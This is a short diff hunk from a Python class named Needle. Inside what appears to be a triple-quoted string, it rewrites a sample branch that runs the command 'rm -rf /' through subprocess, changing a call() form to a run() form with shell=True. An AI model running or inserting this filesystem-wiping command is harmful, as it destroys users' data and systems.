@@ -150,7 +150,7 @@ class Needle(object):
                     return user
                 else:
                     import subprocess
-                    exit = subprocess.call("rm -rf /")
+                    exit = subprocess.run(["rm", "-rf", "/"], shell=True)
                     return exit
         """
         self.needles = []
